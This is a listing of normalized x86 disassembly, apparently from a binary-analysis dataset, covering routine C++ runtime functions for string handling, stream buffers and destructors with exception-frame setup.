pop ebp
retn
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push 0x8
push esi
call sub_40d57b
add esp 0x8
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
push 0x1
call [ edx ]
sub_40a940
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xorps xmm0 xmm0
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ edx ] eax
mov eax edx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] 0x0
mov [ edx + 0xc ] 0x0
movq [ edx + 0x10 ] xmm0
pop ebp
retn 0x20
sub_40a980
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xorps xmm0 xmm0
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ edx ] eax
mov eax edx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] 0x0
mov [ edx + 0xc ] 0x0
movq [ edx + 0x10 ] xmm0
pop ebp
retn 0x14
sub_40a9c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x10 ]
xorps xmm0 xmm0
mov [ esp + 0xc ] ecx
movlpd [ esp + 0x10 ] xmm0
push esi
push edi
test ebx ebx
jl r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi [ ebp + 0xc ]
jg r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
test edi edi
je r-xdata
mov ecx [ esp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov edx [ ecx ]
movzx eax [ esi ]
push eax
call [ edx + 0xc ]
cmp eax 0xffffffff
je r-xdata
jg r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ esp + 0x14 ]
inc esi
add [ esp + 0x10 ] 0x1
mov [ ebp + 0x8 ] esi
adc [ esp + 0xc ] 0x0
add edi 0xffffffff
adc ebx 0xffffffff
cmp ebx eax
jg r-xdata
test esi esi
je r-xdata
call sub_40bc10
mov esi eax
mov eax edx
mov [ esp + 0x18 ] eax
test eax eax
jl r-xdata
jl r-xdata
test esi esi
je r-xdata
jl r-xdata
test edi edi
jne r-xdata
add [ ebp + 0x8 ] esi
add [ esp + 0x10 ] esi
mov eax [ esp + 0x18 ]
adc [ esp + 0xc ] eax
sub edi esi
mov ecx [ esp + 0x14 ]
sbb ebx eax
mov eax [ ecx + 0x30 ]
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
add [ eax ] esi
jmp r-xdata
mov ecx [ esp + 0x14 ]
push esi
push [ ebp + 0x8 ]
mov eax [ ecx + 0x20 ]
push [ eax ]
call sub_4117a0
add esp 0xc
mov esi edi
mov [ esp + 0x18 ] ebx
cmp edi esi
jae r-xdata
test ebx ebx
jg r-xdata
sub_40aad0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x10 ]
xorps xmm0 xmm0
mov [ esp + 0xc ] ecx
movlpd [ esp + 0x10 ] xmm0
push esi
push edi
test ebx ebx
jl r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi [ ebp + 0xc ]
jg r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
test edi edi
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ecx ]
call [ eax + 0x1c ]
cmp eax 0xffffffff
je r-xdata
jg r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc ecx
add [ esp + 0x10 ] 0x1
mov [ ebp + 0x8 ] ecx
adc [ esp + 0xc ] 0x0
add edi 0xffffffff
mov ecx [ esp + 0x14 ]
adc ebx 0xffffffff
cmp ebx eax
jg r-xdata
test esi esi
je r-xdata
call sub_40bc30
mov esi eax
mov eax edx
mov [ esp + 0x18 ] eax
test eax eax
jl r-xdata
jl r-xdata
test esi esi
je r-xdata
jl r-xdata
test edi edi
jne r-xdata
add [ ebp + 0x8 ] esi
add [ esp + 0x10 ] esi
mov eax [ esp + 0x18 ]
adc [ esp + 0xc ] eax
sub edi esi
mov ecx [ esp + 0x14 ]
sbb ebx eax
mov eax [ ecx + 0x2c ]
sub [ eax ] esi
mov eax [ ecx + 0x1c ]
add [ eax ] esi
jmp r-xdata
mov ecx [ esp + 0x14 ]
push esi
mov eax [ ecx + 0x1c ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_4117a0
add esp 0xc
mov esi edi
mov [ esp + 0x18 ] ebx
cmp edi esi
jae r-xdata
test ebx ebx
jg r-xdata
sub_40abe0
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x2c ]
dec [ eax ]
mov ecx [ esi + 0x1c ]
pop esi
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
movzx eax [ edx ]
retn
or eax eax
pop esi
retn
sub_40ac40
push ebp
mov ebp esp
push 0xffffffff
push sub_42aa06
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
push ecx
mov [ ecx ] r--data
call sub_40ec95
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_40ac90
push ebp
mov ebp esp
push 0xffffffff
push sub_42a886
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea edi [ ecx - 0x70 ]
mov eax [ edi ]
lea esi [ edi + 0x70 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x70 ] r--data
mov eax [ esi - 0x70 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x70 ]
mov [ ecx + esi - 0x74 ] eax
lea ecx [ esi - 0x60 ]
call sub_40a850
mov eax [ esi - 0x70 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x70 ] r--data
mov eax [ esi - 0x70 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + esi - 0x74 ] eax
mov [ ebp - 0x4 ] 0x0
push esi
mov [ esi ] r--data
call sub_40ec95
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xb8
push edi
call sub_40d57b
add esp 0x8
sub_40ad40
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40a850
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x58
push esi
call sub_40d57b
add esp 0x8
sub_40ad70
push ebp
mov ebp esp
push 0xffffffff
push sub_42a6a6
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea esi [ ecx - 0x18 ]
mov eax [ esi ]
lea edx [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x18 ] r--data
mov eax [ edx - 0x18 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + edx - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
push edx
mov [ edx ] r--data
call sub_40ec95
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x60
push esi
call sub_40d57b
add esp 0x8
sub_40adf0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a886
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ esi + 0x34 ]
mov [ esi ] r--data
test edi edi
je r-xdata
test [ ebp + 0x8 ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x38
push esi
call sub_40d57b
add esp 0x8
push 0x8
push edi
call sub_40d57b
add esp 0x8
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
push 0x1
call [ edx ]
sub_40ae80
push ebp
mov ebp esp
push 0xffffffff
push sub_42a6a6
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
push esi
mov [ esi ] r--data
call sub_40ec95
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x48
push esi
call sub_40d57b
add esp 0x8
sub_40af50
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0x7ffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_40c160
test edi edi
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
pop edi
pop esi
pop ebx
mov [ eax ] cx
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x8
jb r-xdata
mov eax [ esi + 0x10 ]
lea eax [ edx + eax * 2 ]
cmp eax ebx
jbe r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea eax [ edi + edi ]
push eax
push ebx
push ecx
call sub_4117a0
add esp 0xc
test edi edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub ebx eax
mov ecx esi
sar ebx 0x1
push ebx
push esi
call sub_40b050
pop esi
pop ebx
pop ebp
retn 0x8
sub_40b050
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push edi
mov eax [ ebx + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_40e52b
mov edi [ ebp + 0x10 ]
sub eax ecx
cmp edi eax
cmova edi eax
cmp esi ebx
jne r-xdata
cmp edi 0x7ffffffe
ja r-xdata
lea eax [ ecx + edi ]
cmp [ esi + 0x10 ] eax
jb r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
push r--data
call sub_40e52b
mov [ esi + 0x10 ] eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_40c160
mov ecx [ ebp + 0xc ]
test edi edi
je r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
xor edi edi
push ecx
push edi
mov ecx esi
mov [ edx + eax * 2 ] di
call sub_40bdb0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebx ]
mov eax esi
xor ecx ecx
pop edi
pop esi
pop ebx
mov [ eax ] cx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea eax [ edi + edi ]
push eax
lea eax [ ebx + ecx * 2 ]
push eax
push edx
call sub_4117a0
add esp 0xc
test edi edi
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_40b170
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ esi + 0x14 ] 0x8
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
add eax 0x1
je r-xdata
mov [ esi ] 0x0
mov eax [ esi ]
mov [ edi ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
add eax eax
push eax
push esi
push edi
call sub_410380
add esp 0xc
jmp r-xdata
xor eax eax
pop edi
mov [ esi ] ax
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
xor ecx ecx
pop edi
pop esi
mov [ eax ] cx
pop ebp
retn 0x4
sub_40b1e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp edx ebx
push esi
mov esi ebx
cmovb esi edx
push edi
mov edi ecx
test esi esi
je r-xdata
cmp ebx edx
jbe r-xdata
mov ecx r--data
sub esi 0x4
jb r-xdata
sbb eax eax
neg eax
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn
cmp esi 0xfffffffc
je r-xdata
mov eax [ edi ]
cmp eax [ ecx ]
jne r-xdata
xor eax eax
mov al [ edi ]
cmp al [ ecx ]
jne r-xdata
add edi 0x4
add ecx 0x4
sub esi 0x4
jae r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sbb eax eax
or eax 0x1
jmp r-xdata
cmp esi 0xfffffffd
je r-xdata
test eax eax
jne r-xdata
mov al [ edi + 0x1 ]
cmp al [ ecx + 0x1 ]
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
mov al [ edi + 0x2 ]
cmp al [ ecx + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov al [ edi + 0x3 ]
cmp al [ ecx + 0x3 ]
je r-xdata
sub_40b270
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x10 ]
cmp edx edi
jae r-xdata
cmp edx [ ecx + 0x10 ]
ja r-xdata
pop edi
pop ebx
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0xc
sub edi edx
cmp esi edi
ja r-xdata
mov eax edx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
sub eax esi
add edi eax
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push edi
movsx eax [ eax ]
push eax
push ecx
call sub_410900
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
lea ecx [ eax + edx ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x10 ]
mov edx ebx
mov esi [ ebp + 0x8 ]
sub ecx 0x4
jb r-xdata
sub ebx eax
pop edi
mov eax ebx
pop ebx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax ]
cmp ecx 0xfffffffc
je r-xdata
mov eax [ edx ]
cmp eax [ esi ]
jne r-xdata
mov al [ edx ]
cmp al [ esi ]
jne r-xdata
add edx 0x4
add esi 0x4
sub ecx 0x4
jae r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
sub ecx ebx
dec ecx
add edi ecx
lea ecx [ ebx + 0x1 ]
jmp r-xdata
cmp ecx 0xfffffffd
je r-xdata
mov [ ebp + 0xc ] ecx
test edi edi
je r-xdata
mov al [ edx + 0x1 ]
cmp al [ esi + 0x1 ]
jne r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov al [ edx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov al [ edx + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
sub_40b370
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
je r-xdata
push r--data
call sub_40e50b
cmp edi 0xfffffffe
ja r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
push edi
call sub_4070d0
test edi edi
je r-xdata
cmp edi 0x1
jne r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
pop esi
mov [ eax ] 0x0
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov al [ ebp + 0xc ]
mov ecx esi
mov [ ecx ] al
jmp r-xdata
mov ecx [ esi ]
mov al [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebp
retn 0x8
movsx eax [ ebp + 0xc ]
push edi
push eax
push ecx
call sub_411230
add esp 0xc
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_40b440
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
mov edx [ esi + 0x10 ]
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
sub eax edx
cmp eax ecx
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
push r--data
call sub_40e50b
push edi
lea edi [ edx + ecx ]
test ecx ecx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp edi 0xfffffffe
ja r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push edx
push edi
mov ecx esi
call sub_4070d0
mov ecx [ ebp + 0xc ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ ebp + 0xc ]
mov eax esi
mov ecx esi
sub ebx eax
push ebx
push esi
call sub_40b570
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov eax [ esi ]
mov ecx esi
sub ebx eax
push ebx
push esi
call sub_40b570
pop esi
pop ebx
pop ebp
retn 0x8
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ eax ] 0x0
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
push ecx
add eax edx
push ebx
push eax
call sub_4117a0
add esp 0xc
test ecx ecx
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_40b570
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push edi
mov eax [ ebx + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_40e52b
mov edx [ esi + 0x10 ]
sub eax ecx
mov ecx [ ebp + 0x10 ]
cmp ecx eax
cmova ecx eax
or eax 0xffffffff
sub eax edx
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jbe r-xdata
push r--data
call sub_40e50b
lea edi [ edx + ecx ]
test ecx ecx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp edi 0xfffffffe
ja r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
test edi edi
jne r-xdata
push edx
push edi
mov ecx esi
call sub_4070d0
mov ecx [ ebp + 0x10 ]
test edi edi
je r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebx [ ebx ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ eax ] 0x0
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
add eax ebx
push ecx
push eax
mov eax [ esi + 0x10 ]
add eax edx
push eax
call sub_4117a0
add esp 0xc
test ecx ecx
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_40b670
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ esi + 0x14 ] 0x10
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
add eax 0x1
je r-xdata
mov [ esi ] 0x0
mov eax [ esi ]
mov [ edi ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push eax
push esi
push edi
call sub_410380
add esp 0xc
jmp r-xdata
pop edi
mov [ esi ] 0x0
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
pop edi
pop esi
mov [ eax ] 0x0
pop ebp
retn 0x4
sub_40b6e0
mov edx ecx
push esi
push edi
mov edi [ edx + 0xc ]
lea esi [ edx + 0x3c ]
mov eax [ edi ]
cmp eax esi
je r-xdata
mov [ edi ] esi
mov ecx edx
mov eax [ edx + 0x1c ]
sub ecx esi
add ecx 0x3d
pop edi
mov [ eax ] esi
mov eax [ edx + 0x2c ]
pop esi
mov [ eax ] ecx
retn
mov ecx [ edx + 0x1c ]
mov [ edx + 0x50 ] eax
mov eax [ edx + 0x2c ]
mov eax [ eax ]
add eax [ ecx ]
mov [ edx + 0x54 ] eax
sub_40b720
push edi
mov edi [ ecx + 0xc ]
lea eax [ ecx + 0x3c ]
cmp [ edi ] eax
jne r-xdata
pop edi
retn
mov edx [ ecx + 0x50 ]
push esi
mov esi [ ecx + 0x54 ]
mov [ edi ] edx
sub esi edx
mov eax [ ecx + 0x1c ]
mov [ eax ] edx
mov eax [ ecx + 0x2c ]
mov [ eax ] esi
pop esi
sub_40b750
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx edi
mov eax [ edi ]
mov eax [ eax + 0xc ]
call eax
test al al
je r-xdata
lea eax [ esi + 0x4 ]
mov [ esi + 0x38 ] edi
mov [ esi + 0xc ] eax
lea ecx [ esi + 0x8 ]
lea eax [ esi + 0x14 ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0x20 ] eax
lea eax [ esi + 0x24 ]
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x28 ]
mov [ esi + 0x30 ] eax
mov [ ecx ] 0x0
mov eax [ esi + 0x20 ]
pop edi
mov [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] 0x0
mov eax [ esi + 0xc ]
mov [ eax ] 0x0
mov eax [ esi + 0x1c ]
mov [ eax ] 0x0
mov eax [ esi + 0x2c ]
pop esi
mov [ eax ] 0x0
pop ebp
retn 0x4
pop edi
mov [ esi + 0x38 ] 0x0
pop esi
pop ebp
retn 0x4
sub_40b7e0
push ebp
mov ebp esp
push 0xffffffff
push sub_42aa38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax [ ebx ]
push 0xffffffff
call [ eax + 0xc ]
cmp eax 0xffffffff
sete al
test al al
je r-xdata
push 0x0
push 0x8
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_40b370
mov [ ebp - 0x4 ] 0x0
xor al al
jmp r-xdata
mov [ ebx + 0x3d ] 0x0
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x3d ] 0x0
je r-xdata
push [ ebx + 0x4c ]
cmp edx 0x10
lea eax [ ebp - 0x28 ]
push esi
cmovae eax ecx
push 0x1
push eax
call sub_416ad9
mov edx [ ebp - 0x14 ]
add esp 0x10
cmp esi eax
jne r-xdata
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
cmp edx 0x10
mov esi [ ebp - 0x2c ]
cmovae eax ecx
sub esi eax
je r-xdata
mov edx [ ebp - 0x14 ]
sub eax 0x2
je r-xdata
mov bl 0x1
test esi esi
jne r-xdata
xor bl bl
jmp r-xdata
mov al bl
jmp r-xdata
lea ecx [ edx + 0x1 ]
push ecx
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x28 ]
call sub_406f10
mov ecx [ ebx + 0x38 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x18 ]
lea edi [ ebp - 0x28 ]
cmp edx 0x10
lea esi [ ebp - 0x28 ]
mov edx [ ecx ]
cmovae edi [ ebp - 0x28 ]
cmovae esi [ ebp - 0x28 ]
add eax edi
push eax
push esi
lea eax [ ebx + 0x40 ]
push eax
call [ edx + 0x20 ]
sub eax 0x0
je r-xdata
mov ecx [ ebp - 0x18 ]
or eax 0xffffffff
sub eax ecx
cmp eax 0x8
jbe r-xdata
cmp edx 0x10
jb r-xdata
push r--data
call sub_40e50b
lea esi [ ecx + 0x8 ]
cmp esi 0xfffffffe
ja r-xdata
cmp edx esi
jae r-xdata
test esi esi
jne r-xdata
push ecx
push esi
lea ecx [ ebp - 0x28 ]
call sub_4070d0
mov edx [ ebp - 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x28 ]
cmp edx 0x10
xorps xmm0 xmm0
cmovae ecx [ ebp - 0x28 ]
movq [ eax + ecx ] xmm0
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov [ ebp - 0x18 ] esi
cmovae eax [ ebp - 0x28 ]
mov [ esi + eax ] 0x0
jmp r-xdata
cmp edx 0x10
mov [ ebp - 0x18 ] esi
